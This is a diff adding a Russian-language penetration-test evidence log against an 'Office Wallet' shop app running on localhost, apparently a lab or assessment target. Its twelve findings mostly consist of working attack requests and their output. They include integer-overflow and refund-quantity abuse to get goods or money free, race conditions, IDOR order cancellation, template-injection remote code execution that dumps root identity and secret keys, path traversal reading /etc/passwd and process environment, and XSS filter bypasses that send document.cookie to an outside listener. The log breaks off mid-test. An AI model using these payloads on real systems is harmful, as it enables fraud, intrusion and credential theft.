@@ -1,0 +1,1465 @@
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-01
+################################################################################################
+== 7. OW-01: переполнение чаевых — покупка за 0 рублей ==
+    · tip_kop берётся из формы ParseInt без проверки на переполнение, а дальше
+    · chargeKop = сумма + чаевые (handlers_shop.go:190-196). max int64 в сумме
+    · переполняет int64 в минус, проверка chargeKop < 0 обнуляет результат —
+    · котировка становится 0, и товар уходит бесплатно.
+    → SQL DELETE FROM cart_items WHERE user_id=1
+    ← psql DELETE 0
+    → POST /cart/add  product_id=3 (SNACK 270₽)
+    ← HTTP 302 redirect=http://localhost:18081/cart  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Корзина · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → POST /checkout/quote  tip_kop=9223372036854775807 (max int64)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Подтверждение оплаты · Office Wallet</title>   <link rel="preconnect" href="https://fonts.goog...
+    → SQL SELECT id||'|'||total_kop||'|'||tip_kop FROM checkout_quotes ORDER BY id DESC LIMIT 1;
+    ← psql 151|0|9223372036854775807
+    → POST /checkout/confirm  quote_id=151 (оплата по котировке 0)
+    ← HTTP 302 redirect=http://localhost:18081/orders/207  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Заказ · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT id||'|'||total_kop FROM orders ORDER BY id DESC LIMIT 1;
+    ← psql 207|0
+    ┌─ АРТЕФАКТ · OW-01 · переполнение tip_kop
+    │ строка checkout_quotes: id|total_kop|tip_kop = см. SQL выше
+    │ заказ в БД: 207|0; баланс: 1942339,00 → 1942339,00 руб.
+    └─
+[+] заказ #207 оформлен с total=0, баланс не изменился (1942339,00 -> 1942339,00 руб.) — товар ушёл даром
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-02
+################################################################################################
+== 6. OW-02: котировка по дешёвой корзине, оплата после подорожания ==
+    · Котировка фиксирует цену в момент запроса (checkoutQuote), а при подтверждении
+    · списывается именно она — корзина читается заново, но только чтобы положить
+    · товары в заказ (handlers_shop.go:218-250). Расхождение пишется в anomaly_log
+    · и никого не волнует. Значит: берём котировку на дешёвый товар, добавляем
+    · дорогой, платим по старой цене — оба товара в заказе.
+    → SQL DELETE FROM cart_items WHERE user_id=1
+    ← psql DELETE 0
+    → POST /cart/add  product_id=3 (SNACK 270₽)
+    ← HTTP 302 redirect=http://localhost:18081/cart  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Корзина · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → POST /checkout/quote  (котировка: корзина = 270₽)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Подтверждение оплаты · Office Wallet</title>   <link rel="preconnect" href="https://fonts.goog...
+    → POST /cart/add  product_id=4 (MUG 600₽) — уже ПОСЛЕ котировки
+    ← HTTP 302 redirect=http://localhost:18081/cart  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Корзина · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → POST /checkout/confirm  quote_id=150 (платим по старой котировке)
+    ← HTTP 302 redirect=http://localhost:18081/orders/206  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Заказ · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT id||'|'||total_kop||'|'||lines_json FROM orders ORDER BY id DESC LIMIT 1;
+    ← psql 206|27000|[{"product_id":3,"title":"Набор снеков","price_kop":27000,"qty":1},{"product_id":4,"title":"Кружка Office","price_kop":60000,"qty":1}]
+    ┌─ АРТЕФАКТ · OW-02 · котировка дешевле состава заказа
+    │ строка orders: 206|27000|[{"product_id":3,"title":"Набор снеков","price_kop":27000,"qty":1},{"product_id":4,"title":"Кружка Office","price_kop":60000,"qty":1}]
+    │ списано по quote 27000 коп, строки заказа включают снек и кружку (87000 коп)
+    │ баланс ivanov: 1942609,00 → 1942339,00 руб.
+    └─
+[+] заказ #206: total=27000 коп, а в строках снек И кружка — заплатил 270₽, получил 870₽ (баланс 1942609,00 -> 1942339,00 руб.)
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-03
+################################################################################################
+== OW-03 · гонка повторного использования quote при checkout ==
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 194188900
+    → SQL DELETE FROM cart_items WHERE user_id=(SELECT id FROM users WHERE login='ivanov')
+    ← psql DELETE 0
+    → POST /cart/add product_id=3 for OW-03
+    ← HTTP 302 redirect=http://localhost:18081/cart  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Корзина · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → POST /checkout/quote item_comment=OW03-race-1795717403
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Подтверждение оплаты · Office Wallet</title>   <link rel="preconnect" href="https://fonts.goog...
+    → SQL SELECT total_kop FROM checkout_quotes WHERE id=153
+    ← psql 27000
+    → SQL UPDATE users SET balance_kop=GREATEST(balance_kop,27000) WHERE login='ivanov'
+    ← psql UPDATE 1
+    → SQL SELECT count(*) FROM orders WHERE item_comment='OW03-race-1795717403'
+    ← psql 0
+    → SQL SELECT count(*) FROM orders WHERE item_comment='OW03-race-1795717403'
+    ← psql 3
+    → SQL SELECT used FROM checkout_quotes WHERE id=153
+    ← psql t
+    ┌─ АРТЕФАКТ · OW-03 · гонка на одной checkout quote
+    │ quote #153 total_kop=27000 used_after=t; параллельных POST=12
+    │ orders с marker OW03-race-1795717403: 0 → 3
+    │ HTTP-коды: 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200
+    └─
+[+] одна котировка создала несколько заказов
+    → SQL DELETE FROM orders WHERE item_comment='OW03-race-1795717403'
+    ← psql DELETE 3
+    → SQL DELETE FROM checkout_quotes WHERE id=153
+    ← psql DELETE 1
+    → SQL DELETE FROM cart_items WHERE user_id=(SELECT id FROM users WHERE login='ivanov')
+    ← psql DELETE 0
+    → SQL UPDATE users SET balance_kop=194188900 WHERE login='ivanov'
+    ← psql UPDATE 1
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-04
+################################################################################################
+== 5. OW-04: отмена чужого заказа: деньги идут его владельцу ==
+    · Отмена заказа: проверка владельца стоит только на показе страницы, на самом
+    · действии её нет (handlers_shop.go:304-329). Отменяет заказ кто угодно, а
+    · деньги возвращаются на счёт владельца — учёт и выдача рассинхронизируются.
+    → SQL SELECT id FROM orders WHERE user_id<>1 AND status IN ('paid','delivered') ORDER BY id LIMIT 1
+    ← psql (пусто)
+    · чужого непогашенного заказа не осталось — создаём его напрямую в базе
+    · (доступ к БД у нас из docker-compose.yml, пароль wallet/wallet):
+    → INSERT INTO orders (user_id, status, total_kop, ...) VALUES (2, 'paid', 45000, ...)
+    → SQL INSERT INTO orders (user_id, status, total_kop, lines_json, item_comment) VALUES (2,'paid',45000,'[]','создан для проверки IDOR') RETURNING id
+    ← psql 204
+    INSERT 0 1
+    ← psql: заказ #204 создан
+    → SQL SELECT user_id FROM orders WHERE id=204
+    ← psql 2
+    → SQL SELECT balance_kop FROM users WHERE id=2
+    ← psql 887300
+    → SQL SELECT id||' '||status FROM orders WHERE id=204;
+    ← psql 204 paid
+    ┌─ АРТЕФАКТ · OW-04 · чужой заказ до атаки
+    │ заказ #204, владелец user_id=2, статус=204 paid
+    │ баланс владельца до: 887300 коп
+    └─
+    → GET /orders/204  (просмотр чужого заказа — проверки владельца нет)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Заказ · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    увидели: Заказ #204
+    → POST /orders/204/cancel  (отмена чужого заказа)
+    ← HTTP 302 redirect=http://localhost:18081/orders/204  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Заказ · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT balance_kop FROM users WHERE id=2
+    ← psql 932300
+    → SQL SELECT id||' '||status FROM orders WHERE id=204;
+    ← psql 204 cancelled
+    → SQL SELECT id||' '||status FROM orders WHERE id=204;
+    ← psql 204 cancelled
+    ┌─ АРТЕФАКТ · OW-04 · чужой заказ после атаки
+    │ POST /orders/204/cancel принят; статус: 204 paid → 204 cancelled
+    │ баланс владельца: 887300 → 932300 коп
+    └─
+[+] баланс жертвы 887300 -> 932300 коп: деньги вернулись ей, а отменил заказ ivanov
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-05
+################################################################################################
+== 4. OW-05: возврат: печатаем и уводим деньги ==
+    · Возврат считается как refund = total × qty, а qty не ограничен ни количеством
+    · в заказе, ни суммой, ни знаком (handlers_shop.go:350-363): qty=100 печатает
+    · сотню стоимости заказа, qty=-1 уводит деньги — то, и другое проводится,
+    · при отрицательном только пишется строка в anomaly_log, никто не реагирует.
+    → SQL DELETE FROM cart_items WHERE user_id=1
+    ← psql DELETE 0
+    → POST /cart/add  product_id=1 (товар за 450₽)
+    ← HTTP 302 redirect=http://localhost:18081/cart  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Корзина · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → POST /checkout/quote  item_comment=обычный заказ под возврат
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Подтверждение оплаты · Office Wallet</title>   <link rel="preconnect" href="https://fonts.goog...
+    → POST /checkout/confirm  quote_id=147
+    ← HTTP 302 redirect=http://localhost:18081/orders/202  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Заказ · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT total_kop FROM orders WHERE id=202
+    ← psql 45000
+    · заказ #202 оформлен (45000 коп), делаем возврат с qty=100:
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 189895900
+    → POST /orders/202/return  qty=100 (refund = 45000 коп × 100)
+    ← HTTP 302 redirect=http://localhost:18081/orders/202  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Заказ · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 194395900
+    → SQL SELECT id||'|'||status||'|'||total_kop FROM orders WHERE id=202
+    ← psql 202|returned|45000
+    ┌─ АРТЕФАКТ · OW-05 · завышенный возврат
+    │ balance_kop ivanov: 189895900 → 194395900 (дельта +4500000 коп = цена заказа × 100)
+    │ заказ после возврата: 202|returned|45000
+    └─
+[+] qty=100 начислил в 100 раз больше цены заказа
+    → SQL DELETE FROM cart_items WHERE user_id=1
+    ← psql DELETE 0
+    → POST /cart/add  product_id=1 (товар за 450₽)
+    ← HTTP 302 redirect=http://localhost:18081/cart  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Корзина · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → POST /checkout/quote  item_comment=второй заказ под отрицательный возврат
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Подтверждение оплаты · Office Wallet</title>   <link rel="preconnect" href="https://fonts.goog...
+    → POST /checkout/confirm  quote_id=148
+    ← HTTP 302 redirect=http://localhost:18081/orders/203  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Заказ · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT total_kop FROM orders WHERE id=203
+    ← psql 45000
+    · заказ #203 оформлен (45000 коп), теперь qty=-1 — деньги уходят со счёта:
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 194350900
+    → POST /orders/203/return  qty=-1 (refund = -45000 коп)
+    ← HTTP 302 redirect=http://localhost:18081/orders/203  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Заказ · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 194305900
+    → SQL SELECT id||'|'||status||'|'||total_kop FROM orders WHERE id=203
+    ← psql 203|returned|45000
+    ┌─ АРТЕФАКТ · OW-05 · отрицательное количество возврата
+    │ balance_kop ivanov: 194350900 → 194305900 (дельта -45000 коп)
+    │ заказ после возврата: 203|returned|45000
+    └─
+[+] qty=-1 списал цену заказа, но обработан как возврат
+    → SQL DELETE FROM cart_items WHERE user_id=1
+    ← psql DELETE 0
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-06
+################################################################################################
+== OW-06 · гонка возврата/отмены между чтением статуса и записью ==
+    → SQL SELECT id FROM users WHERE login='ivanov'
+    ← psql 1
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 194188900
+    → SQL INSERT INTO orders(user_id,status,total_kop,lines_json,item_comment) VALUES(1,'paid',5000,'[]','OW-06 return race') RETURNING id
+    ← psql 213
+    INSERT 0 1
+    → SQL SELECT count(*) FROM operations WHERE memo='Возврат заказа #213'
+    ← psql 0
+    → SQL SELECT count(*) FROM operations WHERE memo='Возврат заказа #213'
+    ← psql 3
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 194203900
+    ┌─ АРТЕФАКТ · OW-06 · конкурентный возврат
+    │ заказ #213 total_kop=5000; параллельных POST=12
+    │ refund operations: 0 → 3; balance_kop: 194188900 → 194203900
+    │ ответы HTTP: 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200
+    └─
+[+] несколько конкурентных возвратов прошло для одного заказа
+    → SQL DELETE FROM operations WHERE memo='Возврат заказа #213'
+    ← psql DELETE 3
+    → SQL DELETE FROM orders WHERE id=213
+    ← psql DELETE 1
+    → SQL UPDATE users SET balance_kop=194188900 WHERE login='ivanov'
+    ← psql UPDATE 1
+    OW-06: тестовый заказ/операции удалены, баланс восстановлен
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-07
+################################################################################################
+== 5a. OW-07: GET отмечает заказ полученным ==
+    · /orders/{id}/received меняет статус при GET, без подтверждающего POST.
+    · Проверяем состояние в БД до и после запроса.
+    → POST /cart/add  product_id=1 (товар за 450₽)
+    ← HTTP 302 redirect=http://localhost:18081/cart  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Корзина · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → POST /checkout/quote  item_comment=OW-07 GET side effect
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Подтверждение оплаты · Office Wallet</title>   <link rel="preconnect" href="https://fonts.goog...
+    → POST /checkout/confirm  quote_id=149
+    ← HTTP 302 redirect=http://localhost:18081/orders/205  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Заказ · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT id||' '||status FROM orders WHERE id=205;
+    ← psql 205 paid
+    → GET /orders/205/received (изменение состояния через GET)
+    ← HTTP 302 redirect=http://localhost:18081/orders/205  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Заказ · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT id||' '||status FROM orders WHERE id=205;
+    ← psql 205 received
+    ┌─ АРТЕФАКТ · OW-07 · GET изменил статус заказа
+    │ до: 205 paid
+    │ запрос: GET /orders/205/received → HTTP 200
+    │ после: 205 received
+    └─
+[+] без POST заказ перешёл paid → received
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-08
+################################################################################################
+== 2. OW-08: RCE: комментарий к заказу исполняется как shell-команда ==
+    · Комментарий к заказу (item_comment) подставляется в исходник text/template,
+    · в котором объявлена функция exec — она вызывает sh -c (handlers_shop.go:388-420).
+    · Проверки, что заказ принадлежит текущему пользователю, нет, поэтому хватает
+    · любой учётки. Контейнер приложения работает от root, значит внутри — всё.
+    → POST /cart/add  product_id=1 (товар за 450₽)
+    ← HTTP 302 redirect=http://localhost:18081/cart  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Корзина · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → POST /checkout/quote  item_comment={{exec "id"}} {{exec "hostname"}} {{exec "env"}}
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Подтверждение оплаты · Office Wallet</title>   <link rel="preconnect" href="https://fonts.goog...
+    → POST /checkout/confirm  quote_id=152
+    ← HTTP 302 redirect=http://localhost:18081/orders/208  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Заказ · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+[+] заказ #208 создан, комментарий сохранён в заказ
+    · открываем превью чека — шаблон с нашим комментарием выполняется:
+    → GET /orders/208/preview?renderer=classic  (item_comment → sh -c)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Превью чека · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.co...
+    Чек: uid=0(root) gid=0(root) groups=0(root) 4a1860a837ac DATABASE_URL=postgres://wallet:wallet@db:5432/wallet?sslmode=disable
+    PAYMENT_KEY=office-wallet-pay-key
+    SESSION_KEY=office-wallet-session-key
+    ┌─ АРТЕФАКТ · OW-08 · команда выполнена на сервере
+    │ GET /orders/208/preview → HTTP 200
+    │ Чек: uid=0(root) gid=0(root) groups=0(root) 4a1860a837ac DATABASE_URL=postgres://wallet:wallet@db:5432/wallet?sslmode=disable
+    │ PAYMENT_KEY=office-wallet-pay-key
+    │ SESSION_KEY=office-wallet-session-key
+    └─
+[+] uid=0(root) — root в контейнере; ключи подписей и DSN базы в том же выводе.
+    · Дальше в этой же оболочке: чтение любых файлов, сеть внутри кластера,
+    · сканирование, закладка в /app/exports для /ops/journal.
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-09
+################################################################################################
+== 4. OW-09: чтение любых файлов (path traversal) ==
+    · Фильтр имени файла снимает ../ только один раз, результат после filepath.Join
+    · не проверяется (handlers_shop.go:449-461) — значит путь собирается любой.
+    · Читаем систему и самое ценное — окружение процесса, там ключи и DSN:
+    → POST /statements/export  filename=../../../../etc/passwd
+    ← HTTP 200 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man...
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    → POST /statements/export  filename=../../../../proc/1/environ
+    ← HTTP 200 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin.HOSTNAME=4a1860a837ac.PUBLIC_BASE=http://localhost:18081.PAYMENT_KEY=office-wallet-pay-key.DATABASE_URL=postgres://wallet:wallet@db:5432/wallet?sslmode=disable.MAIL_PORT=1025...
+    PAYMENT_KEY=office-wallet-pay-key
+    DATABASE_URL=postgres://wallet:wallet@db:5432/wallet?sslmode=disable
+    SESSION_KEY=office-wallet-session-key
+    ┌─ АРТЕФАКТ · OW-09 · чтение файлов контейнера через traversal
+    │ POST filename=../../../../etc/passwd → HTTP 200; ответ: root:x:0:0:root:/root:/bin/bash | daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    │ POST filename=../../../../proc/1/environ → найдено: PAYMENT_KEY=office-wallet-pay-key | DATABASE_URL=postgres://wallet:wallet@db:5432/wallet?sslmode=disable | SESSION_KEY=office-wallet-session-key
+    └─
+[+] произвольные файлы контейнера читаются через export
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-10
+################################################################################################
+== OW-10 · внутренняя цена доступна с токеном из каталога ==
+    → GET /api/v2/supply/pricing без токена
+    ← HTTP 403 {"error":"channel required"} 
+    → GET /api/v2/supply/pricing с X-Wallet-Channel
+    ← HTTP 200 [{"id":1,"code":"COFFEE","price_kop":45000,"cost_kop":28000,"supplier_note":"Поставщик: RoastLab, скидка при опте"},{"id":2,"code":"TEA","price_kop":32000,"cost_kop":19000,"supplier_note":"Поставщик: LeafCo"},{"id":3,"code":"SNACK","price_k...
+    ┌─ АРТЕФАКТ · OW-10 · раскрытие закупочной цены
+    │ без токена: HTTP 403; с токеном из OW-39: HTTP 200
+    │ ответ содержит cost_kop/supplier_note: [{"id":1,"code":"COFFEE","price_kop":45000,"cost_kop":28000,"supplier_note":"Поставщик: RoastLab, скидка при опте"},{"id":2,"code":"TEA","price_kop":32000,"cost_kop":19000,"supplier_note":"Поставщик: LeafCo"},{"id":3,"code":"SNACK","price_kop":27000,"cost_kop"...
+    └─
+[+] общий supply-token открыл внутренние цены обычной сессии
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-11
+################################################################################################
+== 10. OW-11: ложный успех корзины и неактивный товар ==
+    · cartAdd не проверяет ни существование товара, ни его флаг active
+    · (handlers_shop.go:123-135), ошибку FK он молча проглатывает и всё равно
+    · пишет flash «Добавлено в корзину». Дальше JOIN в loadCart отбрасывает
+    · несуществующие строки — товар исчезает из корзины, а пользователь уверен,
+    · что добавил. Неактивный товар, наоборот, в корзину попадает и покупается:
+    → SQL DELETE FROM cart_items WHERE user_id=1
+    ← psql DELETE 0
+    → POST /cart/add  product_id=999 (нет в каталоге)
+    ← HTTP 302 redirect=http://localhost:18081/cart  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Корзина · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → SQL SELECT count(*) FROM cart_items WHERE user_id=1;
+    ← psql 0
+    → GET /cart  (что реально в корзине)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Корзина · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    ┌─ АРТЕФАКТ · OW-11 · несуществующий товар
+    │ POST /cart/add product_id=999 → HTTP 200; flash «Добавлено в корзину» показан
+    │ cart_items count=0; GET /cart → HTTP 200, строк товара нет
+    └─
+[+] flash «Добавлено», а в корзине 0 строк — товар молча пропал
+    → SQL UPDATE products SET active=FALSE WHERE id=4 RETURNING id, code, active;
+    ← psql 4|MUG|f
+    UPDATE 1
+    → POST /cart/add  product_id=4 (MUG, active=FALSE)
+    ← HTTP 302 redirect=http://localhost:18081/cart  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Корзина · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → GET /cart  (неактивный товар в корзине)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Корзина · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → SQL SELECT count(*) FROM cart_items c JOIN products p ON p.id=c.product_id WHERE c.user_id=1 AND p.id=4 AND p.active=FALSE
+    ← psql 1
+    ┌─ АРТЕФАКТ · OW-11 · товар active=FALSE в корзине
+    │ product id=4 active=FALSE; строка cart_items JOIN products count=1
+    │ GET /cart отобразил «Кружка» несмотря на active=FALSE
+    └─
+[+] товар с active=FALSE добавлен в корзину — фильтрации нет
+    → SQL UPDATE products SET active=TRUE WHERE id=4;
+    ← psql UPDATE 1
+    → SQL DELETE FROM cart_items WHERE user_id=1;
+    ← psql DELETE 1
+    каталог и корзина возвращены в исходное состояние
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-12
+################################################################################################
+--- проверка 1/5 ---
+== 2. OW-12: что фильтр реально делает: строчный <script> вырезается ==
+    · sanitizeSearchDisplay ищет 'script' через strings.Index — с регистром.
+    · Обычный <script> в ответе превращается в <>, содержимое остаётся мусором:
+    → GET /history?q=<script>alert(1)</script>  (эталон: должно быть вырезано)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>История · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    ┌─ АРТЕФАКТ · OW-12 · контроль фильтра пропускает небезопасный вывод
+    │ GET /history?q=<script>… → HTTP 200
+    │ в сохранённом фрагменте <script> удалён наивной фильтрацией; сырая строка выводится через QRaw
+    └─
+[+] строчный script вырезан, в строке осталось: alert(1)
+
+--- проверка 2/5 ---
+== 3. OW-12: обход регистром: <ScRiPt> доходит до жертвы как есть ==
+    · strings.Index чувствителен к регистру, а теги в HTML — нет. Смешанный
+    · регистр не встречается со списком ни в одном месте, фильтр не трогает
+    · строку, и браузер жертвы такой тег исполняет:
+    → GET /history?q=<ScRiPt>... (обход по регистру)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>История · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    ┌─ АРТЕФАКТ · OW-12 · XSS через mixed-case tag отражён без экранирования
+    │ GET /history?q=<ScRiPt>… → HTTP 200
+    │ HTML payload в ответе: <ScRiPt>new Image().src="http://127.0.0.1:9999/?"+document.cookie</ScRiPt>
+    └─
+[+] payload в ответе байт в байт, экранирования нет: <ScRiPt>new Image().src="http://127.0.0.1:9999/?"+document.cookie</ScRiPt>
+
+--- проверка 3/5 ---
+== 4. OW-12: обход событием, которого нет в списке ==
+    · В списке onerror, onload, onmouseover. Событие onfocus оттуда отсутствует
+    · и не вырезается вообще — плюс autofocus запускает его без действий жертвы:
+    → GET /history?q=<input autofocus onfocus=...>  (onfocus не в чёрном списке)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>История · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    ┌─ АРТЕФАКТ · OW-12 · событие вне denylist отражено без экранирования
+    │ GET /history?q=<input autofocus onfocus=…> → HTTP 200
+    │ ответ содержит: <input autofocus onfocus=new Image().src="http://127.0.0.1:9999/?"+document.cookie>
+    └─
+[+] событие вне списка прошло целиком
+
+--- проверка 4/5 ---
+== 5. OW-12: обход HTML-сущностью: javascript: пишем через сущности ==
+    · Фильтр ищет буквальную строку 'javascript:', и заодно в ней есть подстрока
+    · 'script' — то есть вырезается она целиком, даже если заменить буквы на
+    · сущности, надо ломать и 'script'. В атрибутах браузер декодирует сущности
+    · уже после фильтра, поэтому в исходнике нет ни одной запрещённой строки, а
+    · схема в браузере собирается заново:
+    → GET /history?q=<iframe src=&#106;ava&#115;cript:...>  (сущности вместо j и s)
